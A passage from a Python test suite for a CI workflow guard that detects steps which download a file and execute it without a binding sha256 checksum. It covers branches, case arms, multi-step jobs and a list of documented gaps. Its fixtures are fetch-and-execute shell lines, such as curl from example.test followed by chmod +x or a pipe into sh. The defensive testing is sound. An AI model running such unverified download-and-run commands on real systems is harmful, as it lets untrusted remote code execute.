        why = self.why(wg.Step("get", self.FETCH),
                       wg.Step("check", self.CHECK, None, None, True),
                       wg.Step("run", self.EXEC))
        self.assertIn("continue-on-error", why)

    def test_the_scope_is_never_called_the_step(self):
        for why in (self.why(("get", self.FETCH), ("run", self.EXEC)),
                    self.why(("get", self.FETCH),
                             ("check", 'echo "%s  /tmp/other" | sha256sum -c -\n'
                                       % OTHER_HEX),
                             ("run", self.EXEC))):
            self.assertNotIn("the step's checksum", why)


class TestABranchIsNotAlwaysTaken(unittest.TestCase):
    """#1697 item 3: a `sha256sum -c` inside a `then` branch may not run.

    The reader is flat -- it produces statements, not a tree -- but the words
    that open and close a body (`then`, `else`, `do`, `fi`, `done`) are right
    there in the argv it produced, so "written inside a branch" is a question
    it can answer. This is the shell twin of the `if:` on a step (`_binds`),
    and it is refused for the same reason: a check that may be skipped cannot
    clear an execution that is not.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX
    EXEC = "chmod +x /tmp/payload\n"

    def test_a_check_inside_a_then_branch_clears_nothing_outside_it(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "fi\n" + self.EXEC))

    def test_a_check_inside_a_loop_body_clears_nothing_outside_it(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "for f in x; do\n" + self.CHECK + "done\n" + self.EXEC))

    def test_the_same_branch_as_the_use_still_binds(self):
        # The hardened spelling: fetch, check and use share one body, so they
        # run together or not at all -- refusing this would push authors off
        # the rule instead of onto it.
        self.assertIsNone(wg.fetch_exec_defect(
            "if true; then\n" + self.FETCH + self.CHECK + self.EXEC + "fi\n"))

    def test_a_then_branch_does_not_clear_an_else_branch(self):
        # The check runs FIRST in statement order, so ordering is not what
        # refuses it: the two bodies are alternatives.
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "else\n" +
            self.EXEC + "fi\n"))

    def test_a_check_after_the_fi_still_binds(self):
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then :; fi\n" + self.CHECK + self.EXEC))

    def test_a_nested_branch_does_not_clear_its_parent(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + "if true; then\n" + self.CHECK +
            "fi\n" + self.EXEC + "fi\n"))

    # `case` arms are branch bodies too, and after the `if`/`else` twin was
    # refused this was the one spelling left that still bought the credit.
    CASE_SPLIT = ("case $x in\n"
                  " a)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  " b)\n"
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX

    def test_one_arm_of_a_case_does_not_clear_another(self):
        self.assertIsNotNone(wg.fetch_exec_defect(self.CASE_SPLIT))

    def test_an_arm_written_on_one_line_is_read_at_all(self):
        # `a) curl …` puts the pattern where the command was expected, which
        # hid the fetch itself -- the same class as `then` and `f() {`.
        script = ("case $x in\n"
                  " a) curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '    echo "%s  /tmp/payload" | sha256sum -c - ;;\n'
                  " b) chmod +x /tmp/payload ;;\n"
                  "esac\n") % HEX
        self.assertEqual(1, len(wg.fetches(script)), wg.fetches(script))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_one_arm_holding_all_three_still_binds(self):
        script = ("case $x in\n"
                  " a)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_an_alternation_pattern_still_opens_a_new_arm(self):
        script = ("case $x in\n"
                  " a|b)\n"
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  " c)\n"
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_quoted_multi_word_arm_patterns_still_open_their_own_arms(self):
        # Round-2 re-review: the arm regex forbade whitespace, so a pattern
        # written `"a b")` -- one word carrying a space once the quotes are
        # read -- did not open an arm. With ONE such arm the `case` keyword's
        # own body still separated it from the next recognised arm; with two,
        # both bodies shared that region and a check in one cleared a use in
        # the other.
        script = ("case $x in\n"
                  ' "a b")\n'
                  "   curl -sfL https://example.test/payload -o /tmp/payload\n"
                  '   echo "%s  /tmp/payload" | sha256sum -c -\n'
                  "   ;;\n"
                  ' "c d")\n'
                  "   chmod +x /tmp/payload\n"
                  "   ;;\n"
                  "esac\n") % HEX
        stmts = shell_reader.statements(script)
        bodies = workflow_forms.regions(stmts)
        fetch = next(i for i, st in enumerate(stmts)
                     if st.stages[0].argv and st.stages[0].argv[0] == "curl")
        run = next(i for i, st in enumerate(stmts)
                   if st.stages[0].argv and st.stages[0].argv[0] == "chmod")
        self.assertNotEqual(bodies.get(fetch), bodies.get(run), bodies)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_check_after_the_esac_still_binds(self):
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + "case $x in\n a)\n   :\n   ;;\nesac\n" +
            self.CHECK + self.EXEC))

    # Every terminator that ENDS an arm, not just `;;`. Reading only `;;`
    # left the parser expecting a body, so the next arm's `b)` closed a
    # subshell that was never opened and `b` became the command -- which
    # SHADOWED the `curl` behind it, and a guard that sees no download
    # reports a clean step (fix round on #1714, Critical 2).
    TERMINATORS = (";;", ";&", ";;&")

    def test_a_terminator_does_not_hide_the_next_arms_command(self):
        for terminator in self.TERMINATORS:
            script = ("case $x in a) echo hi %s b) %s esac\n"
                      % (terminator, self.FETCH.replace("\n", " ;; ")))
            with self.subTest(terminator=terminator):
                fetches = wg.fetches(script)
                self.assertEqual(1, len(fetches), fetches)
                self.assertEqual("/tmp/payload", fetches[0].dest)

    def test_a_terminator_still_opens_a_NEW_arm(self):
        # The other half: the reset has to put a BOUNDARY there too, or a
        # check in one arm clears a use in the next. `;&` falls through at
        # run time, but only when the FIRST pattern matched -- arriving at
        # `b)` directly runs no check at all, so the arms stay separate.
        for terminator in self.TERMINATORS:
            script = ("case $x in\n a)\n   " + self.FETCH + "   " +
                      self.CHECK + "   " + terminator + "\n b)\n   " +
                      self.EXEC + "   ;;\nesac\n")
            with self.subTest(terminator=terminator):
                self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_the_message_says_it_was_the_branch(self):
        why = wg.fetch_exec_defect(
            self.FETCH + "if true; then\n" + self.CHECK + "fi\n" + self.EXEC)
        self.assertIn("the checksum that names", why)
        self.assertIn("branch", why)

    def test_a_branch_in_one_step_does_not_reach_into_the_next(self):
        # Each step is its own shell invocation, so an unterminated `if` in
        # step A must not make step B's checksum look conditional.
        self.assertEqual([], wg.job_defects(
            [("a", "if true; then :; fi\n"),
             ("b", self.FETCH + self.CHECK + self.EXEC)]))


class TestAScriptsKeywordsAreItsOwn(unittest.TestCase):
    """Review I-3 of the #1793 follow-ups: `regions` read the keywords of a
    script handed to a shell as the step's own, so the `fi` in
    `sh <<< 'fi' || true` closed the loop around it, and the checksum after
    it read as unconditional. With X unset, bash 3.2 and 5.2 skip the loop and
    run `./tool` with the checksum failing. A script's statements now sit in
    the branch of the command that runs it, and its keywords shape only its
    own map."""

    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
    CHECK = 'echo "%s  tool" | sha256sum -c -\n' % HEX

    def job(self, opened, form, closed):
        return wg.job_defects([("step", self.FETCH + opened + form + "\n" + self.CHECK +
                                closed + "./tool\n")])

    def test_a_close_inside_a_script_does_not_close_the_steps_branch(self):
        for opened, closed in (("for f in $X; do\n", "done\n"),
                               ('if [ -n "$X" ]; then\n', "fi\n")):
            for form in ("sh <<< 'fi' || true", "sh -c 'fi' || true",
                         "sh <<'EOF' || true\nfi\nEOF", "eval 'fi' || true",
                         "sh -c 'done; esac' || true"):
                with self.subTest(opened=opened, form=form):
                    found = self.job(opened, form, closed)
                    self.assertEqual(1, len(found), found)
                    self.assertIn(wg._UNSHARED_BRANCH, found[0][1])

    def test_an_open_inside_a_script_does_not_hold_the_steps_branch_open(self):
        # The loop's `done` closed the script's `then` instead of the loop, and
        # `./tool` read as inside the loop with the checksum.
        found = wg.job_defects([("step", self.FETCH + "for f in $X; do\n" + self.CHECK +
                                 "sh -c 'if true; then' || true\ndone\n./tool\n")])
        self.assertEqual(1, len(found), found)
        self.assertIn(wg._UNSHARED_BRANCH, found[0][1])

    def test_a_script_on_the_line_opening_a_branch_runs_in_it(self):
        # It was read ahead of the `then`/`do` that carries it, as if it always
        # ran: base cleared `./tool` after `fi` with it, and bash skips it.
        for form in ("if [ -n \"$X\" ]; then sh -c '%s'; fi\n",
                     "for f in $X; do sh -c '%s'; done\n",
                     "if [ -n \"$X\" ]; then sh <<< '%s'; fi\n"):
            with self.subTest(form=form):
                found = wg.job_defects([("step", self.FETCH + form % self.CHECK.strip() +
                                         "./tool\n")])
                self.assertEqual(1, len(found), found)
                self.assertIn(wg._UNSHARED_BRANCH, found[0][1])
        # ... and, the other way, in the arm its pattern opens, with the use.
        self.assertEqual([], wg.job_defects([("step", self.FETCH + "case \"$X\" in\n"
                                              "  a) sh -c '%s'; ./tool ;;\nesac\n"
                                              % self.CHECK.strip())]))

    def test_the_scripts_own_branches_still_bind(self):
        # A checksum inside the script's own `if` clears nothing outside it;
        # one after the script's balanced branch clears the use after it.
        self.assertIn(wg._UNSHARED_BRANCH, wg.job_defects([("step", self.FETCH +
            "sh -ec 'if [ -n \"$X\" ]; then %s; fi'\n./tool\n" % self.CHECK.strip())])[0][1])
        self.assertEqual([], wg.job_defects([("step", self.FETCH +
            "sh -ec 'if true; then :; fi; %s'\n./tool\n" % self.CHECK.strip())]))
        self.assertEqual([], wg.job_defects([("step", self.FETCH + 'if [ -n "$X" ]; then\n' +
            "sh -ec '%s'\n./tool\nfi\n" % self.CHECK.strip())]))

    def test_without_the_script_the_branch_is_reported_as_before(self):
        # The must-trip control: reported on every tree.
        found = self.job("for f in $X; do\n", ":", "done\n")
        self.assertEqual(1, len(found), found)


class TestTheJobIsTheScope(unittest.TestCase):
    """M5: steps in one job share the workspace, /tmp and PATH.

    A rule scoped to a single `run:` block is evaded by splitting the act in
    two -- step A downloads, step B runs it -- and neither step is a
    fetch-and-exec on its own. The same sharing is what makes a checksum in a
    later step a legitimate verification of an earlier fetch, so the fold has
    to run both ways.
    """

    FETCH = ("fetch", "curl -sfL https://example.test/payload -o /tmp/payload\n")
    CHECK = ("check", 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
    RUN = ("run", "chmod +x /tmp/payload\n/tmp/payload --version\n")

    def test_a_fetch_in_one_step_and_the_execution_in_another(self):
        found = wg.job_defects([self.FETCH, self.RUN])
        self.assertEqual(1, len(found), found)
        step, why = found[0]
        self.assertEqual("fetch", step)         # attributed to the fetching step
        self.assertIn("/tmp/payload", why)

    def test_a_checksum_in_a_later_step_binds_an_earlier_fetch(self):
        self.assertEqual([], wg.job_defects([self.FETCH, self.CHECK, self.RUN]))

    def test_order_is_the_job_order(self):
        # The same three steps, check last: verified only AFTER the run.
        found = wg.job_defects([self.FETCH, self.RUN, self.CHECK])
        self.assertEqual(1, len(found), found)
        self.assertIn("only AFTER", found[0][1])

    def test_a_conditional_steps_check_does_not_count(self):
        # M4: folding an `if:` step as if it always runs is conservative on the
        # fetch axis and FAIL-OPEN on the check axis -- a checksum that may be
        # skipped cannot clear a download that always happens.
        steps = [wg.Step(*self.FETCH),
                 wg.Step(self.CHECK[0], self.CHECK[1], None,
                         "github.event_name == 'push'"),
                 wg.Step(*self.RUN)]
        found = wg.job_defects(steps)
        self.assertEqual(1, len(found), found)
        self.assertEqual("fetch", found[0][0])

    def test_a_check_under_the_SAME_condition_as_the_use_still_binds(self):
        # The shape the fleet actually has (nvd-cache.yml's sync step): the
        # fetch, the checksum and the `unzip` share one `if:`, so they run
        # together or not at all. A blanket "no conditional check counts" rule
        # fails THIS, which is how the fleet caught it.
        when = "steps.decide.outputs.sync == 'true'"
        steps = [wg.Step(self.FETCH[0], self.FETCH[1], None, when),
                 wg.Step(self.CHECK[0], self.CHECK[1], None, when),
                 wg.Step(self.RUN[0], self.RUN[1], None, when)]
        self.assertEqual([], wg.job_defects(steps))

    def test_one_conditional_step_holding_all_three_binds(self):
        script = self.FETCH[1] + self.CHECK[1] + self.RUN[1]
        self.assertEqual([], wg.job_defects(
            [wg.Step("sync", script, None, "steps.decide.outputs.sync == 'true'")]))

    def test_a_conditional_step_still_counts_as_fetching(self):
        steps = [wg.Step(self.FETCH[0], self.FETCH[1], None, "always()"),
                 wg.Step(*self.RUN)]
        self.assertEqual(1, len(wg.job_defects(steps)))

    def test_a_job_level_condition_reaches_every_step(self):
        doc = {"jobs": {"b": {"if": "github.ref == 'main'",
                              "steps": [{"run": "make test"}]}}}
        self.assertEqual("github.ref == 'main'", wg.run_jobs(doc)[0][1][0].condition)

    def test_a_job_with_no_fetch_is_clean(self):
        self.assertEqual([], wg.job_defects([("build", "make test\n")]))


class TestEveryUseIsAskedForItsCheck(unittest.TestCase):
    """Review I-1 of the #1793 follow-ups: `_defect` asked only a download's
    FIRST use whether a binding checksum came before it. A use inside the
    checksum's branch, `case` arm, loop body or `if:` step, ahead of a use
    after it, took the binding, and the job read clean while bash 3.2 and 5.2
    run the later use with the checksum skipped. Each use is asked now, in
    order, and the first one no checksum clears is the one reported: reading
    one more use can add a report, never remove one."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % HEX
    PLACES = ("shell branch", "case arm", "loop", "if: step")
    # (where the download lands, a use the follow-ups taught the guard to
    # read, the use after it that nothing guards)
    USES = (("tool", '"$PWD/tool" --version', "./tool"),                      # #2310
            ("/usr/local/bin/tool", "tool --version", "/usr/local/bin/tool"),  # #2308
            ("tool", "env x-y=1 ./tool --version", "./tool"),                 # #2307
            ("tool", "sh <<< './tool --version'", "./tool"))                  # #2293

    def job(self, place, dest, inside, after):
        fetch = "curl -fsSL -o %s %s\n" % (dest, self.URL)
        body = self.CHECK % dest + (inside + "\n" if inside else "")
        if place == "if: step":
            return [wg.Step("get", fetch), wg.Step("check", body, None, "env.X == 'y'"),
                    wg.Step("run", after + "\n")]
        opened, closed = {"shell branch": ('if [ -n "$X" ]; then\n', "fi\n"),
                          "case arm": ('case "$X" in\na)\n', ";;\nesac\n"),
                          "loop": ("for f in $X; do\n", "done\n")}[place]
        return [("step", fetch + opened + body + closed + after + "\n")]

    def assertReported(self, place, found):
        self.assertEqual(1, len(found), found)
        self.assertIn(wg._UNSHARED_IF if place == "if: step" else wg._UNSHARED_BRANCH,
                      found[0][1])

    def test_a_use_the_checksum_guards_does_not_clear_one_after_it(self):
        for place in self.PLACES:
            for dest, inside, after in self.USES:
                with self.subTest(place=place, inside=inside):
                    self.assertReported(place, wg.job_defects(self.job(place, dest, inside, after)))

    def test_nor_does_a_use_the_guard_always_read(self):
        # The same weakness with a use the guard read before the follow-ups:
        # base read these clean as well.
        for place in self.PLACES:
            with self.subTest(place=place):
                self.assertReported(place, wg.job_defects(
                    self.job(place, "tool", "./tool --version", "./tool")))

    def test_without_the_use_inside_it_is_reported_as_before(self):
        # The must-trip control: reported on every tree.
        for place in self.PLACES:
            for dest, _inside, after in self.USES:
                with self.subTest(place=place, after=after):
                    self.assertReported(place, wg.job_defects(self.job(place, dest, None, after)))

    def test_a_checksum_before_every_use_still_clears_them_all(self):
        for dest, inside, after in self.USES:
            script = ("curl -fsSL -o %s %s\n" % (dest, self.URL) + self.CHECK % dest +
                      'if [ -n "$X" ]; then\n%s\nfi\n%s\n' % (inside, after))
            with self.subTest(inside=inside):
                self.assertEqual([], wg.job_defects([("step", script)]))


class TestAnUnparseableShellIsNotAPass(unittest.TestCase):
    """L1: the parser reads sh/bash. A step that runs pwsh, python or cmd is
    not clean, it is UNREAD -- and saying so is the only honest answer."""

    def test_a_pwsh_step_is_reported(self):
        found = wg.job_defects([wg.Step("install", "Invoke-WebRequest x", "pwsh")])
        self.assertEqual(1, len(found), found)
        self.assertIn("pwsh", found[0][1])

    def test_a_python_step_is_reported(self):
        found = wg.job_defects([wg.Step("install", "import urllib", "python")])
        self.assertIn("python", found[0][1])

    def test_bash_and_sh_are_parsed(self):
        for shell in ("bash", "sh", "bash -e {0}", None):
            self.assertEqual([], wg.job_defects([wg.Step("x", "make test\n", shell)]),
                             shell)

    def test_the_effective_shell_comes_from_the_document(self):
        doc = {"defaults": {"run": {"shell": "pwsh"}},
               "jobs": {"b": {"steps": [{"name": "s", "run": "echo hi"}]}}}
        self.assertEqual([("b", [wg.Step("s", "echo hi", "pwsh")])],
                         wg.run_jobs(doc))

    def test_a_job_default_shell_beats_the_workflow_default(self):
        doc = {"defaults": {"run": {"shell": "pwsh"}},
               "jobs": {"b": {"defaults": {"run": {"shell": "bash"}},
                              "steps": [{"run": "echo hi", "shell": "sh"}]}}}
        self.assertEqual("sh", wg.run_jobs(doc)[0][1][0].shell)


# --- #1697: the documented gap list, as executable pins -----------------------
# The module docstring names ten forms this guard does not model. A list of
# fail-open forms written only in prose ROTS: a form that starts being caught
# keeps its entry, a form that stops being caught gains none, and either way
# the list stops describing the control. So each of the ten runs here, through
# `job_defects`, in the smallest step that spells it -- and the assertion is
# the current answer, whatever that answer is.
#
# Every one of them was accepted when this class was written. #1697 then ruled
# each by REACHABILITY: four were reachable and are CLOSED, so their pin is
# `flagged`; six keep their entry in the docstring with the reason they keep
# it, so their pin is `accepted` -- the fail-open state said out loud, where a
# change that starts catching one has to come and edit it.


class TestTheGapsTheGuardDocuments(unittest.TestCase):
    """#1697: the ten forms the module docstring ruled, each as a live step,
    and an eleventh ruled since (#2308)."""

    def accepted(self, *steps):
        """The job is clean -- this form goes unseen, and says so out loud."""
        found = wg.job_defects(list(steps))
        self.assertEqual([], found, found)

    def flagged(self, *steps):
        """The form was ruled reachable and the guard now reports it."""
        found = wg.job_defects(list(steps))
        self.assertEqual(1, len(found), found)
        return found[0][1]

    # 1. a fetcher that is not curl/wget.
    def test_a_fetcher_that_is_not_curl_or_wget(self):
        for fetch in ("gh release download v1.2.3 -O /tmp/payload\n",
                      "aws s3 cp s3://bucket/payload /tmp/payload\n"):
            self.accepted(("get", fetch), ("run", "chmod +x /tmp/payload\n"))

    # 2. variable expansion: the same file under two spellings.
    def test_a_destination_spelled_one_way_and_used_another(self):
        self.accepted(("get", 'DEST=/tmp/payload\n'
                              'curl -sfL https://example.test/p -o "$DEST"\n'),
                      ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))

    def test_a_use_spelled_another_way_off_the_command_word(self):
        # #2310 closed a command word with a `$` ending in the download's
        # basename (`TestADownloadRunThroughAnExpandedPath`); an operand, a
        # word whose last part expands and a tilde still name nothing fetched.
        fetch = ("get", "curl -sfL https://example.test/p -o payload\n")
        for run in ('sh "$PWD/payload"\n', 'P=./payload\n"$P" 9\n', "~/payload 9\n"):
            with self.subTest(run=run):
                self.accepted(fetch, ("run", run))
        self.flagged(fetch, ("run", '"$PWD/payload" 9\n'))

    # Grouping parentheses are read with or without surrounding whitespace.
    def test_a_fetch_at_the_head_of_a_tight_subshell_is_read(self):
        tight = "(curl -sfL https://example.test/payload -o /tmp/payload || true)\n"
        self.assertEqual(1, len(wg.fetches(tight)), wg.fetches(tight))
        self.flagged(("get", tight), ("run", "chmod +x /tmp/payload\n"))

    def test_the_same_subshell_with_a_space_is_read(self):
        spaced = "( curl -sfL https://example.test/payload -o /tmp/payload || true )\n"
        self.assertEqual(1, len(wg.fetches(spaced)), wg.fetches(spaced))
        self.flagged(("get", spaced), ("run", "chmod +x /tmp/payload\n"))

    def test_nested_grouping_and_case_alternatives_keep_the_fetch(self):
        for script in (
                "( (curl -sfL https://example.test/payload -o /tmp/payload))\n",
                "(case x in x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac)\n",
                "case x in (x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac\n"):
            with self.subTest(script=script):
                self.assertEqual(1, len(wg.fetches(script)))
                self.flagged(("get", script), ("run", "chmod +x /tmp/payload\n"))

    def test_quoted_and_escaped_parentheses_stay_literal(self):
        for script in ('echo "(curl -sfL https://example.test/x)"\n',
                       r'\(curl -sfL https://example.test/x\)' + '\n'):
            with self.subTest(script=script):
                self.assertEqual([], wg.fetches(script))
        fetch = wg.fetches('(curl -sfL "https://example.test/(payload)" -o /tmp/payload)')[0]
        self.assertEqual(fetch.url, "https://example.test/(payload)")
        self.assertEqual(fetch.dest, "/tmp/payload")

    # 3. what runs inside a container. CLOSED for the shape the fleet can
    # reach -- a bind mount and an interpreter operand -- because the reader
    # already yields that argv. Mounts are NOT modelled: the binding is by
    # basename, which is the only name the bytes have on the far side.
    def test_a_container_running_the_download_under_a_shell(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                     ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))

    def test_a_podman_run_counts_the_same(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                     ("run", "podman run --rm -v /tmp:/w img sh /w/x.sh\n"))

    def test_a_container_running_another_file_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img bash /w/other.sh\n"))

    def test_a_verified_download_may_be_run_in_a_container(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("check", 'echo "%s  /tmp/x.sh" | sha256sum -c -\n' % HEX),
                      ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))

    def test_a_docker_build_is_not_a_container_run(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker build -f x.sh .\n"))

    # The three shapes the container entry still names as unread, each one a
    # pin so the docstring cannot drift from what the code does.
    def test_a_file_renamed_by_the_mount_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp/x.sh:/w/y.sh img "
                              "bash /w/y.sh\n"))

    def test_an_argument_the_entrypoint_supplies_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img\n"))

    def test_what_the_image_runs_on_its_own_is_unread(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
                      ("run", "docker run --rm -v /tmp:/w img /w/x.sh\n"))

    def test_the_fleets_own_container_line_is_still_clean(self):
        # adapter-integration.yml's shape, which fetches nothing: the scan must
        # not invent a use out of an `--entrypoint sh` and an image name.
        self.accepted(("run", 'docker run --rm -v "$PWD:/work:ro" -w /work '
                              "--entrypoint sh panopticon-fixtures:latest "
                              '-c "python3 -m pytest tests/tools/ -q"\n'))

    # 4. bytes modified after a passing check.
    def test_bytes_modified_after_a_passing_check(self):
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX),
                      ("run", "sed -i s/a/b/ /tmp/p\nchmod +x /tmp/p\n/tmp/p\n"))

    # 5. a chmod over a glob -- and over a directory, which is the same act.
    # CLOSED: ordinary bash, and the fleet writes both spellings
    # (`chmod -R a+rX odc-data` in nvd-cache.yml, `find ... | xargs` in both
    # Dockerfiles). A glob names nothing, but it DESIGNATES the download.
    def test_a_chmod_over_a_glob_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod +x /tmp/d/*.sh\n"))

    def test_a_recursive_chmod_over_the_directory_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod -R +x /tmp/d\n"))

    def test_a_recursive_chmod_over_the_root_is_the_widest_of_all(self):
        # `os.path.normpath("/")` is `/`, so the prefix test asked whether the
        # path starts with `//`: the single widest spelling bound nothing.
        self.flagged(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                     ("run", "chmod -R +x /\n"))

    def test_a_recursive_chmod_over_the_root_leaves_a_relative_file_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o x.sh\n"),
                      ("run", "chmod -R +x /\n"))

    def test_a_glob_that_does_not_match_the_download_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("run", "chmod +x /tmp/d/*.py\n"))

    def test_a_recursive_chmod_over_another_directory_is_left_alone(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("run", "chmod -R +x /tmp/e\n"))

    def test_a_glob_bound_download_can_still_be_cleared(self):
        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
                      ("check", 'echo "%s  /tmp/d/x.sh" | sha256sum -c -\n' % HEX),
                      ("run", "chmod +x /tmp/d/*.sh\n"))

    # 6. a fetch inside an `eval` STRING (not a substitution). CLOSED: the
    # string is shell, and this module reads shell -- the quotes are not a
    # grammar it lacks, only one it was not looking through.
    def test_a_fetch_inside_an_eval_string(self):
        self.flagged(("get", 'eval "curl -sfL https://example.test/p -o /tmp/p"\n'),
                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_fetch_inside_a_sh_dash_c_string(self):
        self.flagged(("get", 'sh -c "curl -sfL https://example.test/p -o /tmp/p"\n'),
                     ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_clustered_c_flag_is_still_a_script(self):
        # `sh -ec`, `bash -lc`, `bash -euc`: the ordinary CI idiom, not an
        # obfuscation. A short-option cluster carrying `c` IS `-c`.
        for opener in ("sh -ec", "bash -lc", "bash -euc", "bash -x -c"):
            self.flagged(("get", '%s "curl -sfL https://example.test/p '
                                 '-o /tmp/p"\n' % opener),
                         ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_shell_flag_cluster_without_c_hands_over_no_script(self):
        self.accepted(("run", 'sh -eu "curl -sfL https://example.test/p '
                              '-o /tmp/p"\nchmod +x /tmp/p\n'))

    def test_a_fetch_and_its_use_both_inside_the_string(self):
        self.flagged(("run", 'eval "curl -sfL https://example.test/p -o /tmp/p; '
                             'chmod +x /tmp/p"\n'))

    def test_a_checksum_inside_the_string_still_clears_it(self):
        # The expansion keeps the ORDER, so a step hardened inside its own
        # quoted script is read as hardened rather than as unread -- where
        # the checksum stops the script: under `sh -ec`, and not under a bare
        # `sh -c`, which carries on to the `chmod` (review I-2).
        script = ('sh -%s "curl -sfL https://example.test/p -o /tmp/p; '
                  'echo %s  /tmp/p | sha256sum -c -; chmod +x /tmp/p"\n')
        self.accepted(("run", script % ("ec", HEX)))
        self.assertIn("carries on past its failure", self.flagged(("run", script % ("c", HEX))))

    def test_a_pipe_to_a_shell_inside_the_string_is_still_a_pipe_to_a_shell(self):
        self.flagged(("run", 'eval "curl -sfL https://example.test/i.sh | sh"\n'))

    def test_a_string_that_fetches_nothing_is_left_alone(self):
        self.accepted(("run", 'sh -c "echo hello; /usr/bin/true"\n'))

    # 7. an executor that reads the file by convention, not by argument.
    def test_an_executor_that_reads_the_file_by_convention(self):
        self.accepted(("get", "curl -sfL https://example.test/m -o Makefile\n"),
                      ("run", "make\n"))
        self.accepted(("get", "curl -sfL https://example.test/p -o package.json\n"),
                      ("run", "npm install\n"))

    # 8. a digest computed from the download itself.
    def test_a_digest_computed_from_the_download_itself(self):
        self.accepted(
            ("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
            ("check", 'SHA="$(sha256sum /tmp/p | cut -d\' \' -f1)"\n'
                      'echo "$SHA  /tmp/p" | sha256sum -c -\n'),
            ("run", "chmod +x /tmp/p\n/tmp/p\n"))

    def test_a_sums_file_the_step_computed_from_the_download_is_already_caught(self):
        # The other spelling of the same theatre, and this half is NOT a gap:
        # the recorded text is `sha256sum /tmp/p`, which carries no digest.
        found = wg.job_defects(
            [("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
             ("check", "sha256sum /tmp/p > /tmp/p.sha\nsha256sum -c /tmp/p.sha\n"),
             ("run", "chmod +x /tmp/p\n")])
        self.assertEqual(1, len(found), found)

    # 9. `find -exec` and `xargs` operands. CLOSED with 5: the same act, the
    # operand describing the file instead of naming it.
    def test_a_find_exec_operand_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", r"find /tmp -name p -exec chmod +x {} \;" "\n"))

    def test_an_xargs_operand_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "echo /tmp/p | xargs chmod +x\n"))

    def test_a_find_piped_into_xargs_is_making_it_executable(self):
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "find /tmp -name p | xargs chmod +x\n"))

    def test_a_stage_that_merely_names_xargs_inherits_nothing(self):
        # `xargs` counts where it stands IN FRONT of the command, which is
        # where `command()` strips it. A file that happens to be called
        # `xargs` is an operand, and operands hand nothing over.
        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                      ("run", "echo /tmp/p | chmod +x xargs\n"))

    def test_an_option_before_the_starting_point_still_walks_it(self):
